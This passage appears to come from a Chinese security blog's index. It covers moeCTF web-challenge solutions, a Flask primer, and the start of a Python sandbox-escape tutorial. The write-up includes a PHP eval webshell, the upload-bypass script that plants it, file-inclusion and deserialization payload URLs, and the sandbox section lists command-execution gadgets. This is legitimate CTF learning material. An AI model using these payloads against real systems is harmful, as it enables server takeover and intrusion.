height=\"300px\">\n\n第一眼还没看懂，这应该满足他的条件即可拿到flag\n\n1和2,分别get和post传参，\n\n3.修改Cookie为character为admin\n\n4.添加字段X-Forward-For: 127.0.0.1\n\n5.修改User-Agent内容为MoeBrowser\n\n<img src=\"\\img\\9-12\\8.png\">\n\n\n\n# Web入门指北\n\n签到题二\n\n解密：\n\n```text\n666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959 6c396a61474673624756755a3055684958303 \n```\n\n对密码不是很熟悉，但对这里应该只能是md5、base64、16进制\n\n一看只能是16进制\n\n进行16进制解码：``flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0``\n\n这里面还加了一层base64,\n\n进行解码：`moectf{w3lCome_To_moeCTF_W2b_challengE!!}`\n\n# 彼岸的flag\n\n签到题三\n\n查看源代码搜索注释(<!--)就行（藏得靠后...）\n\n<img src=\"\\img\\9-12\\9.png\">\n\n\n\n# Cookie\n\n根据他给出的api进行注册和登录，然后获取flag\n\n<img src=\"\\img\\9-12\\10.png\" height=\"300px\">\n\n提示我们不是admin用户，拿到cookie,\n\n进行base64解码，得到`{\"username\": \"yyj\", \"password\": \"123456\", \"role\": \"user\"}`\n\n修改为`{\"username\": \"admin\", \"password\": \"123456\", \"role\": \"admin\"}`\n\n再进行base64编码得到eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYiLCAicm9sZSI6ICJhZG1pbiJ9\n\n替换Cookie中的token值，再访问flag，得到flag\n\n```json\n{\"error\": \"ok\", \"data\": {\"flag\": \"moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}\"}}\n```\n\n\n\n# gas!gas!gas!\n\n多看了几眼，根据他给的说明，要正确提交正确的表单，\n\n<img src=\"/img/9-12/11.png\">\n\n然后根据规则，编写python脚本，注意一下Cookie(session)问题，开始还没注意到\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\n\n#默认post参数\ndata={\n    \"driver\": \"yyj\",\n\"steering_control\": '0',\n\"throttle\": '2'\n}\n#url\nurl='http://localhost:60713'\n#默认cookie\ncookies={\n    'session': '.eJxtjdsKAiEURf_lPEuoo8fLr2TINKM0UQ6YJxqif0-GHntZsC_s_YZpLa2ut3hZSgMPgXSWOZDjeghkMKtA1qopUM68E6XrvjYD75Tu3OnkuNMEUsni3hTAYK7LM9W-uW3XLkt6tfh7A3_kTJ4Y1JXKDJ4zeLSxttiWewIv0CktLBp7QMlxsIrB30QJ8_kCkKs6Qw.ZQBNlg.s5GIQKXa8JudrZi3dGeeS_T699Q'\n}\n\n\n#精确爬虫，也可以不搞\ndef result(res):\n    html=BeautifulSoup(res,'lxml')\n    fl=html.body.div.string\n    if(fl):\n        print('请求结果：',fl)\n    else:\n        print('请求结果：',html.body.div)\n    return res\n\ndef setdata(res,data):\n    if '向右' in res:\n        data['steering_control']='-1'\n    elif '向左' in res:\n        data['steering_control']='1'\n    else:\n        print('其他')\n        data['steering_control']='0'\n    if '太小' in res:\n        data['throttle']='0'\n    elif '太大' in res:\n        data['throttle']='2'\n    else:\n        print('其他')\n        data['throttle']='1'\n    return data\n\nfor i in range(20):\n    print('第'+str(i)+'次')\n    print('请求数据：',data)\n    res=requests.post(url=url,data=data,cookies=cookies)\n    fl=result(res.text)\n    if(res.cookies):\n        cookies=requests.utils.dict_from_cookiejar(res.cookies)\n    data=setdata(fl,data=data)\n    if 'moectf' in res.text:\n        break\n    print()\n```\n\n跑一下就可以出flag\n\n<img src=\"/img/9-12/12.png\">\n\n\n\n# moe图床\n\n经典文件上传处理\n\n首页查看js源码，查看ajex，发现upload.php\n\n<img src=\"/img/9-12/15.png\">\n\n进行访问，得到源码\n\n<img src=\"/img/9-12/16.png\">\n\n对上传文件检查了文件类型，和文件名，关键$fileNameParts = explode('.', $fileName); 将文件名变为数组后，$secondSegment = $fileNameParts[1]; \n\n固定取下标为1\n\n绕过：抓包，修改文件类型为image/png,修改文件名为test.png.php\n\n这里我没抓包，我用的python脚本\n\n```python\nimport requests\nurl ='http://localhost:55163/upload.php'\nfile={\n    'file':('test.png.php' #文件名\n            ,open(\"D:/phpstudy_pro/WWW/upload- picture/link.php\",'rb')\n            ,'image/png' #文件类型\n            )\n\n}\nres=requests.post(url,files=file)\nprint(res.text)\n```\n\n上传一句话木马成功！\n\n<img src=\"/img/9-12/17.png\">\n\n这里附上一句话木马（不看就好-*-*）\n\n```php\n89504E47\n<?php echo phpinfo();\n@eval($_POST['bb']); ?>\n```\n\n访问验证一下\n\n<img src=\"/img/9-12/18.png\">\n\n用蚁剑一连，flag就在根目录\n\n<img src=\"/img/9-12/19.png\">\n\n\n\n# meo图床\n\n\n\n\n\n文件上传先试下水，上传成功\n\n<img src=\"\\img\\9-12\\1.png\">\n\n查看一下图片\n\n<img src=\"\\img\\9-12\\2.png\">\n\n看这url,应该是用着文件包含，再试试，尝试包含/etc/passwd\n\n<img src=\"\\img\\9-12\\3.png\">\n\n这里只能显示图片，burp抓下包，这里我改成用python脚本(也一样)\n\n<img src=\"\\img\\9-12\\4.png\">\n\nok,成功包含,试下flag\n\n<img src=\"\\img\\9-12\\5.png\">\n\n居然是个提示(.......),访问一下Fl3g_n0t_Here_dont_peek!!!!!.php\n\n这里发现是PHP的md5弱比较,不多说了\n\n最终payload\n\n```text\nhttp://localhost:55371/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=s878926199a&param2=s214587387a\n```\n\n<img src=\"\\img\\9-12\\6.png\">\n\n\n\n# 夺命十三枪\n\n典型的PHP反序列化中的字符串逃逸题目\n\n访问它包含的文件Hanxin.exe.php ，得到源码，\n\n对两个页面进行代码审计，发现，关键是反序列化后Spear_Owner 属性为MaoLei 就可获得flag\n\n而我们可以通过get传参给Chant 属性赋值，恰巧他对序列化的字符串进行了如下的字符串替换\n\n<img src=\"/img/9-12/13.png\">\n\n所以先写出要逃逸的字符串：\t\n\n```text\n\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}\n```\n\n然后要逃逸的字符总数为35个，\n\n发现：di_qi_qiang 替换后增加5个字符，di_jiu_qiang 替换后增加20个字符\n\n因此加入di_qi_qiang 3个，di_jiu_qiang个；序列化后替换后会恰好增加35个字符，然后后面的字符就能逃逸出去，进行反序列化到}结束，就此覆盖了他构造函数对Spear_Owner 赋值，拿到flag\n\n最终payload\n\n```text\nhttp://localhost:53192/?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_jiu_qiang\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}\n```\n\n<img src=\"/img/9-12/14.png\">\n\n\n\n","tags":["ctf","wp"]},{"title":"入门flask框架","url":"/2023/08/28/入门flask框架/","content":"\n\n\n# 入门Flask框架\n\n\n\nFlask是一个用Python语言编写的轻量级Web应用框架，它采用WSGI工具箱和Jinja2模板引擎，该框架使用简单的核心和扩展，没有默认的数据库和窗体验证工具，被称为“微框架”。\n\n**核心**\n\nWSGI工具箱采用Werkzeug(路由模块)，模板引擎采用jinja2\n\n**特点**\n\n轻量级，只提供一些核心操作 \n\n## **相关知识**\n\n**框架**：Web框架是一种用于开发Web应用的软件架构，它提供了一些通用的功能和组件，使得开发者可以更方便、高效、安全地构建Web应用。\n\n**模板引擎**（Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。\n\n模板引擎的核心原理就是两个字：**替换**。将预先定义的标签字符替换为指定的业务数据，或者根据某种定义好的流程进行输出\n\n模板：模板是一种文件，它可以包含固定的和动态的内容。动态的内容通常是用一种特定的语法来表示的，\n\n**路由(route)**：简单来说，路由就是URL到视图函数的映射。当访问某个URL时，就会执行对应的函数\n\n如：/usersu        ->  getAllUsers()\n\n router 可以理解为一个容器，或者说一种机制，它管理了一组 route。简单来说，route 只是进行了URL和函数的映射，而在当接收到一个URL之后，去路由映射表中查找相应的函数，这个过程是由 router 来处理的。\n\n## 构成\n\n```python\nfrom flask import Flask        #1.导入\napp=Flask(__name__)            #2.创建Flask对象，管理全局路由，配置信息\n\n@app.route('/')            #3.设置装饰器，将路由映射到视图函数\ndef index():                #4.定义触发函数\n    return 'Hello world'\n\nif __name__=='__main__':\n    app.run()                #5.Flask对象调用run方法,启动服务器\n```\n\n目录结构：app.py主程序,templates存放模板文件，static存放静态文件\n\n**装饰器**\n\n装饰器的一般语法结构如下：\n\n```python\ndef decorator(func): \n# 定义装饰器函数，接收一个函数作为参数\n    def wrapper(*args, kwargs):\n         # 定义包装函数，接收任意数量的参数\n         # 在这里可以添加一些代码，在原函数执行前后执行\n         return func(*args, kwargs) \n     # 调用原函数，并返回结果\n    return wrapper # 返回包装函数\n```\n\n要使用装饰器，可以在要被装饰的函数上方使用@符号，后面跟着装饰器的名称。\n\n```\n@decorator # 使用@符号应用装饰器def my_func(): # 定义要被装饰的函数pass # 函数体\n```\n\n这相当于执行了以下代码：\n\n```\ndef my_func():\n    pass\n\nmy_func = decorator(my_func) # 将my_func作为参数传给decorator，并将返回值赋给my_func\n```\n\n## 初始化\n\n#### flask对象初始化参数\n\nFlask(import_name,static_url_path,static_floder,template_folder)\n\nimport_name(必要):\n\n工程(主模块)目录名称，__name__当前模块(目录)名称，可决定访问静态文件的路径\n\nstatic_url_path\n\n静态文件访问路径，默认为/+static_floder\n\nstatic_floder\n\n静态文件存储的文件夹名称，默认为'stastic'\n\ntemplate_folder\n\n模板文件存储的文件夹名称，默认为'templates'\n\n#### web应用程序配置参数\n\n作用：集中管理项目中所有的配置\n\nflask将配置信息放入了app.config属性之中，该属性可以按照字典类型进行操作\n\n##### 设置\n\n1.从配置对象中加载\n\napp.config.from_object(配置对象)，如\n\n```\nclass DefaultConfig(object)：          #设置配置类\n    SECRET_KEY='acdvdasd'\n    \napp.config.from_object(DefaultConfig)\n```\n\n2.从配置文件中加载\n\napp.config.from_pyfile('文件名')\n\n3.从环境变量中加载\n\napp.config.from_envvar('环境变量名')\n\napp.run(host=\"0.0.0.0\",port=5000,debug=True,threaded=True)\n\ndebug调试模式\n\n1.程序修改后可以自动重启\n\n2.服务器出现错误能够返回给前端\n\nthreaded--是否开启多线程\n\n终端启动--flask run -h 0.0.0.0 -p 5000\n\n读取环境变量FLASK_APP的值作为启动文件\n\nexport FLASK_APP=app \n\n## 路由与蓝图\n\n##### 查看全部路由\n\n1.命令行\n\nflask routes\n\n2.程序中查看\n\napp.url_map\n\napp.url_map.iter_rules()--返回列表\n\n##### 指定请求方式\n\n默认支持的请求方式：GET、OPTION、HEAD\n\napp.route('url',methods=list)\n\n### 蓝图\n\n一个存储一组视图方法的容器对象，具有以下特d\n\n- 一个应用可以具有多个Blueprint\n- 可以将一个Blueprint注册到任何一个未使用的URL下\n- 蓝图可以单独具有自己的模板、静态文件、或其他通用操作方法，并不是必须实现应用视图和函数\n- 一个应用初始化时，就应该注册需要使用Blueprint，蓝图并不是一个完整应用，必须要注册到某一应用中\n\n#### 使用\n\n1.创建蓝图对象\n\n```python\nfrom flask import Blueprint\nuser_bp=Blueprint('user',__name__)\n```\n\n2.在这个蓝图对象上进行操作，注册路由，指定静态文件，注册模板过滤器\n\n```python\n@user_bp.route('/')\ndef user_profile():\n    return 'usee_profile'\n```\n\n3.在应用对象上注册蓝图对象\n\n```\napp.register_blueprint(user_bp)\n```\n\n## 请求与响应\n\n转化器，获取动态url参数\n\n**获取路径参数**\n\nroute('/user/<converter:id>')\n\nconverter--数据类型：string（默认）、int、flaot、path、uuid、any\n\nurl_for()--根据函数获取url\n\n##### 获取请求数据\n\n通过request对象获取\n\n| 属性    | 说明                         | 类型           |\n| ------- | ---------------------------- | -------------- |\n| data    | 记录请求数据，并转化为字符串 | *              |\n| form    | 记录请求中的表单数据         | MultiDict      |\n| args    | 记录查询参数                 | MultiDict      |\n| cookies | 记录请求中cookie信息         | Dict           |\n| headers | 记录请求头信息               | EnvironHeaders |\n| method  | 记录请求的HTTP方法           | GET/POST       |\n| url     | 记录URL地址                  | string         |\n| files   | 记录请求上传的文件           | *              |\n\n示例\n\n```\nid=request.args.get('id')\n```\n\n### 处理响应\n\n##### 1.模板渲染\n\n使用render_template方法渲染模板并返回\n\n**导入**\n\n```\nfrom flask import render_template\n```\n\n**使用**\n\n```\nreturn render_template('index.html',mystr(模板内变量名)=strval(程序中的变量),...)\n```\n\n参数已经封装成字典，在字典前添加**,如**data\n\nrender_template_string()将字符串当作模板文件内容进行渲染\n\n##### 2.重定向\n\n```python\nfrom flask import redirect\n...\n    return redirect(url)\n```\n\n##### 3.返回JSON\n\n```python\nfrom flask import jsonify\n    return jsonify(json_dict)\n```\n\n**自定义状态码和响应头**\n\nmake_respone(其中一种方式)\n\n```python\nresp=make_respone('test')\nresp.headers['Itcast']='Test'\nresp.status=\"404  not found\"\nreturn resp\n```\n\n### cookie和session\n\nresponse.setcookie( )\n\nresponse.delete_cookie()--删除cookie\n\n```python\nfrom flask import session\nsession['test']='test'\n```\n\n## 请求钩子与上下文\n\n### 异常处理\n\nabort(code)\n\nhttp异常主动抛出，抛出一个状态码code\n\n##### 捕获错误\n\nerrorhandler装饰器\n\n注册一个错误处理程序，当程序抛出异常时，就会执行装饰器的方法\n\n```python\n@app.errorhandler(500(状态码或异常的类型))\ndef server_error(e):\n...\n```\n\n### 请求钩子\n\n请求钩子是一种在Flask框架中实现请求前后执行一些操作的方法，比如打印日志、验证身份、处理异常等。请求钩子是通过**装饰器**的形式实现，Flask支持如下四种请求钩子：\n\n- `before_first_request`：在处理第一个请求之前执行，可以用于初始化项目的一些配置或资源。\n- `before_request`：在每次请求之前执行，可以用于判断权限、转换路由参数或预处理客户端请求的数据。\n- `after_request`：在每次请求（视图函数处理）之后执行，前提是视图函数没有出现异常，可以用于修改响应数据、记录操作历史、清理收尾工作等。\n- `teardown_request`：在每次请求之后执行，无论视图函数是否出现异常，可以用于记录异常信息、释放资源等。\n\n示例\n\n```python\n@app.before_first_request\ndef init_db():\n    print(\"初始化数据库连接\")\n```\n\n### 上下文\n\nFlask中的上下文是指在处理请求时，Flask会创建一些对象，如request, session, current_app, g等，这些对象保存了请求相关的信息或程序的状态。上下文可以让视图函数直接访问这些对象，而不需要通过参数传递。\n\nFlask中有两种上下文：请求上下文和程序上下文。\n\n- 请求上下文包括request和session，它们是从_request_ctx_stack这个LocalStack对象中获取的。\n- 程序上下文包括current_app和g，它们是从_app_ctx_stack这个LocalStack对象中获取的。\n\n##### 请求上下文\n\n--解决多线程问题\n\nrequest、session\n\n##### 程序上下文\n\n不同文件下调用对象\n\n**current_app**\n\n```python\nfrom flask import current_app\n引用current_app相当于主程序中的app对象\ncurrent_app.config.get('Itcast')\n```\n\n**g对象**\n\ng作为flask程序全局的一个临时变量，便于函数之间的参数传递\n\n## 模板\n\n模板中的变量\n\n`{{ var }}`,视图传递模板的数据，变量不存在，默认忽略\n\n模板中的标签\n\n`{% tag %}`\n\n###   主要语法标签：\n\n变量标记 - `{{ }}`\n\n语句执行 - ``{% %}``\n\n注释语句 - ``{# #}``\n\n变量输出：\n\n变量输出以``{{ }}``包裹\n\n变量 - ``{{变量名}}``，比如`{{myname}}`\n\n对象 - `{{obj.属性}}`、字典 - `{{dict['key']}}`、列表 - `{{lists[i]}}`、函数 - `{{func()}}`\n\n**条件语句**：\n\n根据条件选择显示不同的html部分\n\n```\n{% if condition %}\n     html\n{% elif condition %}\n    html\n{% else %}\n    html\n{% endif %}\n```\n\nfor **循环语句**：\n\n```\n{% for item in items %}\n   html{{item}} html\n{% endfor %}\n```\n\n设置变量\n\n```\n{% set a='666' %}\n{{ a }}\n```\n\n##### 模板继承\n\n将网页结构提取出来，新建一个base.html\n\n继承语法：\n\n`{% extend \"base.html\" %}`\n\n其中base.html为父模板，所有的字模板脑结构都继承自base\n\n模板全局变量\n\n上下文处理函数：\n\n```\n@app.context_processor\ndef account():\nusername = \"luxp\"\nreturn {'username':'luxp'}\n```\n\n每个视图函数执行的时候，会自动执行该函数，接受该变量传给模板渲染函数","tags":["web","web框架","python"]},{"title":"初探python沙箱逃逸","url":"/2023/08/28/初探python沙箱逃逸/","content":"\n\n\n# 初探python沙箱逃逸\n\n\n\n为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数和模块，例如 os\n\n沙箱逃逸就是绕过某些函数，特殊字符串，或模块的限制，达到一个漏洞环境\n\n# **基础知识**\n\n### 命令执行函数与模块\n\n在 Python 中执行系统命令的方式有：\n\n- os：`system`,`popen`\n- commands：(仅限`2.x`)`getstatusoutput`,`getoutput`\n- subprocess: `getstatusoutput`,`getoutput`\n- timeit：`timeit.sys`、`timeit.timeit(\"__import__('os').system('whoami')\", number=1)`\n- platform：`platform.os`、`platform.sys`、`platform.popen('whoami', mode='r', bufsize=-1).read()`\n- pty：`pty.spawn('ls')`、`pty.os`\n- bdb：`bdb.os`、`cgi.sys`\n- cgi：`cgi.os`、`cgi.sys`\n\n```python\nprint(os.system('whoami'))\nprint(os.popen('whoami').read()) \nprint(os.popen2('whoami').read()) # 2.x\nprint(os.popen3('whoami').read()) # 2.x\nprint(os.popen4('whoami').read()) # 2.x\n...\n```\n\n\n\n### 命名空间和作用域\n\n命名空间定义了在某个作用域内变量名和绑定值之间的对应关系，命名空间是键值对的集合，变量名与值是一一对应关系。作用域定义了命名空间中的变量能够在多大范围内起作用。命名空间在python解释器中是以字典的形式存在的，是以一种可以看得见摸得着的实体存在的。作用域是python解释器定义的一种规则，该规则确定了运行时变量查找的顺序，是一种形而上的虚的规定。\n\n**命令空间**\n\n- 命名空间提供了一个在大型项目下避免名字冲突的方法\n- Python 中各个命名空间都是独立的，他们之间无任何关系\n- 一个命名空间中不能有重名，但不同的命名空间是可以重名而没有任何影响。\n\n命名空间的种类分为 3 类，命名空间的种类也体现了命名空间的生命周期。三个种类及生命周期描述如下：\n\n1）内置名称（built-in names）\n\nPython 语言内置的名称，比如函数名 abs、char 和异常名称 BaseException、Exception 等等。\n\n生命周期：\n\n对于Python built-in names组成的命名空间，它在Python解释器启动的时候被创建，在解释器退出的时候才被删除；\n\n2）全局名称（global names）\n\n模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。\n\n生命周期：\n\n对于一个Python模块的global namespace，它在这个module被import的时候创建，在解释器退出的时候退出；\n\n3）局部名称（local names）\n\n函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量。（类中定义的也是）\n\n生命周期：\n\n对于一个函数的local namespace，它在函数每次被调用的时候创建，函数返回的时候被删除。\n\n注意： 命名空间的生命周期取决于对象的作用域，如果对象执行完成，则该命名空间的生命周期就结束。 因此，我们无法从外部命名空间访问内部命名空间的对象。例如：\n\n```python\n# var1 是全局名称\nvar1 = 5\ndef some_func(): \n  \n    # var2 是局部名称\n    var2 = 6\n    def some_inner_func(): \n  \n        # var3 是内嵌的局部名称\n        var3 = 7\n```\n\n局部的命名空间 -> 全局命名空间 -> 内置命名空间\n\n**作用域**\n\n作用域就是一个 Python 程序可以直接访问命名空间的正文区域。\n\n- Python 程序中，直接访问一个变量，会从内到外依次访问所有的作用域直到找到，否则会报未定义的错误。\n- Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。\n- Python 中， 变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称\n\n作用域分为4类，分别如下：\n\n- L（Local）：最内层，包含局部变量，比如一个函数/方法内部。\n- E（Enclosing）：包含了非局部(non-local)也非全局(non-global)的变量。比如两个嵌套函数，一个函数（或类） A 里面又包含了一个函数 B ，那么对于 B 中的名称来说 A 中的作用域就为 nonlocal。\n- G（Global）：当前脚本的最外层，比如当前模块的全局变量。\n- B（Built-in）： 包含了内建的变量/关键字等，最后被搜索。\n\n作用域规则顺序为： L->E->G->B 如果变量在局部内找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再找不到就去内置中找，\n\n\n\n## Python import机制\n\n具体细节参考官方文档\n\n### **模块 module 与 包 package**\n\n模块--\n\n一个 *.py* 后缀文件即是 Python 的一个模块。在模块的内部，可以通过全局变量 `__name__` 来获得模块名。模块可以包含可执行的语句，这些语句会在模块 **初始化** 的时候执行 —— 当所在模块被 `import` 导入时它们有且只会执行一次。\n\n包--\n\n目前的 Python 实际上是有两种包的存在：**正规包**（*regular Package*） 以及 **命名空间包**（*Namespace package*）。\n\n> 要注意的是，Python 的 package 实际上都是特殊的 module ：可以通过导入 package 之后查看 `globals()` 可知；实际上，任何带有 **path** 属性的对象都会被 Python 视作 package 。\n\n- 正规包： 在 Python 3.2 之前就已经存在了的，通常是以包含一个 `__init__.py` 文件的目录形式展现。当 package 被导入时，这个 `__init__.py` 文件会被 *隐式* 地执行。\n- 命名空间包： 根据 PEP420 的定义，命名空间包是由多个 *portion* 组成的 —— *portion* 类似于父包下的子包，但它们物理位置上不一定相邻，而且它们可能表现为 .zip 中的文件、网络上的文件等等。命名空间包不需要 `__init__.py` 文件，只要它本身或者子包（也就是 *portion*）被导入时，Python 就会给顶级的部分创建为命名空间包 —— 因此，命名空间包不一定直接对应到文件系统中的对象，它可以是一个 *虚拟* 的 module 。\n\n## import导包\n\nimport就是将python文件转化为一个python对象--module 的一个操作\n\n模块中的 Python 代码可以通过 import（导入）操作访问另一个模块内的代码。`import` 语句时调起导入机制的常用方式，但不是唯一方式。`importlib.import_module()` 以及内置的 `__import__()` 函数都可以调起导入机制。\n\n`import` 语句实际上结合了两个操作：\n\n1. 搜索操作：根据指定的命名查找模块\n2. 绑定操作：将搜索的结果绑定到当前作用域对应的命名上\n\n`import` 的 search 操作实际上是带参调用 `__import__()` 函数，而函数的返回值会用在 `import` 语句的绑定操作上。\n\n直接调用 `__import__()` 只会执行模块查找，以及如果找到的话就创建模块。这会有一定的副作用，比如导入父包和更新各式各样的缓存（包括 `sys.modules`），而且绑定操作只有 `import` 语句才会做得到。\n\n> 其他调起导入机制的行为（比如 `importlib.import_module()`）有可能会绕过 `__import__()` 并使用自定义的方法来实现导入。\n\n当一个模块被首次导入时，Python 会搜索该模块，如果找到就创建一个 `module` 对象并初始化；如果未找到则抛出 `ModuleNotFoundError` 异常。至于如何找到这些模块，Python 定义了多种的 **搜索策略** （search strategy），而这些策略可以通过 `importlib` 等提供的各类 hook 来修改和扩展。\n\n> 根据 Python 3.3 的 changlog 可知目前导入系统已完全实现了 PEP302 的提案，所有的导入机制都会通过 `sys.meta_path` 暴露出来，不会再有任何隐式的导入机制。\n\n## import搜索机制\n\n#### **模块搜索路径**\n\n当我们要导入一个模块（比如 `foo` ）时，解释器首先会根据命名查找内置模块，如果没有找到，它就会去查找 `sys.path` 列表中的目录，看目录中是否有 *foo.py* 。`sys.path` 的初始值来自于：\n\n- 运行脚本所在的目录（如果打开的是交互式解释器则是当前目录）\n- `PYTHONPATH` 环境变量（类似于 `PATH` 变量，也是一组目录名组成）\n- Python 安装时的默认设置\n\n为了开始搜索，Python 需要被导入模块（或者包）的完全限定名(*fully qualified name*)。这个名称可能作为 `import` 语句的参数得到，或者是从函数 `importlib.import_module()` 或 `__import__()` 的传参得到。\n\n#### 1.**缓存 cache**\n\n在导入搜索开始前，会先检查 `sys.modules` \n\n`sys.modules` 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 `os` 是默认被加载进来的，但是不能直接使用（但是可以通过 `sys.modules` 来使用，例如 `sys.modules[\"os\"]`），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。\n\n它是导入系统的缓存，如果之前已经导入过 `foo.bar.baz`，则将会包含 `foo`，`foo.bar` 以及 `foo.bar.baz` 键，其对应的值为各自的 `module` 对象。\n\n导入期间，如果在 `sys.modules` 找到对应的模块名的键，则取出其值，导入完成（如果值为 `None` 则抛出 `ModuleNotFoundError` 异常）；否则就进行搜索操作。\n\n> `sys.modules` 是可修改的，强制赋值 `None` 会导致下一次导入该模块抛出 `MoudleNotFoundError` 异常；如果删掉该键则会让下次导入触发搜索操作。\n\n注意，如果要更新缓存，使用 **删除** **sys.modules** **的键** 这种做法会有副作用，因为这样回导致前后导入的同名模块的 `module` 对象不是同一个。最好的做法应该是使用 `importlib.reload()` 函数。\n\n#### 2.**查找器** **finder** **和加载器** **loader**\n\n如果在缓存中找不到模块对象，则 Python 会根据 import 协议去查找和加载该模块进来。这个协议在 PEP320 中被提出，有两个主要的组成概念：finder 和 loader 。finder 的任务是确定能否根据已知的策略找到该名称的模块。同时实现了 finder 和 loader 接口的对象叫做 **importer** —— 它会在找到能够被加载的所需模块时返回自身。\n\nPython 自带了一些默认的 finder 和 importer 。其中第一个知道 **如何定位内置模块**，第二个知道 **如何定位 frozen 模块**，第三个默认的 finder 会在 **import path** 中查找模块（即 `path based finder`）。\n\n> 注意在 Python 3.4 之前 finder 会直接返回 loader 而不是 module spec，后者实际上已经包含了 loader 。\n\n我们可以打印来看一下这三个 Importer 和 Finder ：\n\n```python\nimport sys\nimport pprint\npprint.pprint(sys.meta_path)\n# [<class '_frozen_importlib.BuiltinImporter'>,\n#  <class '_frozen_importlib.FrozenImporter'>,\n#  <class '_frozen_importlib_external.PathFinder'>]\n```\n\nfinder 并不会真正加载模块。如果他能找到对应命名的模块，会返回一个 *module spec*，它实际上是 module 导入所需信息的封装，供后续导入机制使用来加载模块。\n\n#### **import hook**\n\nimport hook 是用来扩展 import 机制的，它有两种类型\n\n- meta hook\n- import path hook\n\nmeta hook 会在导入的最开始被调用（在查找缓存 `sys.modules` 之后），你可以在这里重载对 `sys.path`、frozen module甚至内置 module 的处理。只需要往 `sys.meta_path` 添加一个新的 finder 即可注册 meta_hook 。\n\nimport path hook 会在 `sys.path` （或 `package.__path__`）处理时被调用，它们会负责处理 `sys.path` 中的条目。只需要往 `sys.path_hooks` 添加一个新的可调用对象即可注册 import path hook 。\n\n#### **元路径 meta_path**\n\n当无法从 `sys.modules` 中找到模块时，Python 会继续搜索 `sys.meta_path` 列表，列表中的 finder 会被**依次**用来查询是否知道如何处理这个命名的模块。\n\n所有的 *meta path* *finder* 都必须实现 `find_spec` 方法（参考 *importlib.abc.MetaPathFinder.find_spec*），如果无法处理就返回 `None`；否则返回一个 `spec` 对象（即 `importlib.machinery.ModuleSpec` 的实例）。如果全部的 finder 都没有返回，将抛出 `ModuleNotFoundError` 异常并放弃导入。\n\n**find_spec(fullname, path, target=None)**\n\n以 foo.bar.baz 模块为例对 `find_spec` 进行说明\n\n参数说明示例fullname被导入模块的完全限定名foo.bar.bazpath供搜索使用的路径列表，对于最顶级模块，这个值为 None；对于子包，这个值为父包的 __path__ 属性值foo.bar.__path__target用作稍后加载目标的现有模块对象，这个值仅会在重载模块时传入None\n\n对于单个导入请求可能会多次遍历 meta_path，加入示例的模块都尚未被缓存，则会在每个 finder （以 `mpf` 命名）上依次调用\n\n- mpf.find_spec(\"foo\", None, None)\n- mpf.find_spec(\"foo.bar\", foo.__path__, None)\n- mpf.find_spec(\"foo.bar.baz\", foo.bar.__path__, None)\n\n> Python 3.4 之后 finder 的 `find_module()` 已被 `find_spec()` 所替代并弃用。\n\n## import加载机制\n\n源代码\n\n```python\nmodule = None\nif spec.loader is not None and hasattr(spec.loader, 'create_module'):\n    # It is assumed 'exec_module' will also be defined on the loader.\n    # 假定 loader 中已经定义了 `exec_module` 模块\n    module = spec.loader.create_module(spec)\nif module is None:\n    module = ModuleType(spec.name)\n# The import-related module attributes get set here:\n# 和模块导入相关联的属性在这个初始化方法中被设置\n_init_module_attrs(spec, module)\n\nif spec.loader is None:\n    if spec.submodule_search_locations is not None:\n        # namespace package\n        # 倘若这个模块是命名空间包\n        sys.modules[spec.name] = module\n    else:\n        # unsupported\n        # 不支持命名空间包\n        raise ImportError\nelif not hasattr(spec.loader, 'exec_module'):\n    module = spec.loader.load_module(spec.name)\n    # Set __loader__ and __package__ if missing.\n    # 如果缺失 `__loader__` 和 `__package__` 属性则要补充\nelse:\n    sys.modules[spec.name] = module\n    try:\n        spec.loader.exec_module(module)\n    except BaseException:\n        try:\n            del sys.modules[spec.name]\n        except KeyError:\n            pass\n        raise\nreturn sys.modules[spec.name]\n```\n\n以下是一些细节：\n\n- 在 loader 执行 `exec_module` 之前，需要将模块缓存在 `sys.modules` ：因为模块可能会导入自身，这样做可以防止无限递归（最坏情况）或多次加载（最好情况）。\n- 如果加载失败，那么失败的模块会从 `sys.modules` 中被移除。任何已经存在的模块或者依赖但成功加载的模块都会保留 —— 这和重载不一样，后者即使加载失败也会保留失败的模块在 `sys.modules` 中。\n- 模块的执行是加载的关键步骤，它负责填充模块的命名空间。模块执行将会全权委托给 loader ，由 loader 决定如何填充和填充什么。\n- 创建出来并传递给 `exec_module` 执行的 module 对象可能和最后被 import 的 module 对象不一样。\n\n### **loader** **对象**\n\nloader 是 `importlib.abc.Loader` 的实例，负责提供最关键的加载功能：模块执行。它的 `exec_module()` 方法接受唯一一个参数 —— module 对象，它所有的返回值都会被忽略。\n\nloader 必须满足以下条件：\n\n- 如果这个 module 是一个 Python module（和内置模块以及动态加载的扩展相区分），则 loader 应该在模块的全局命名空间（`module.__dict__`）中执行模块代码。\n- 如果 loader 不能执行模块，应该抛出 `ImportError` 异常。\n\nPython 3.4 的两个变化：\n\n1. loader 提供 create_module() 来创建 module 对象（接受一个 module spec object 并返回 module object）。如果返回 None ，则由导入机制自行创建模块。因为 module 对象在模块执行前必须存在 sys.modules 中。\n2. load_module() 方法被 exec_module() 方法替代，为了向前兼容，如果存在 load_module() 且未实现 exec_module， 导入机制才会使用 load_module() 方法。\n\n### **module** **spec** **对象**\n\nmodule spec 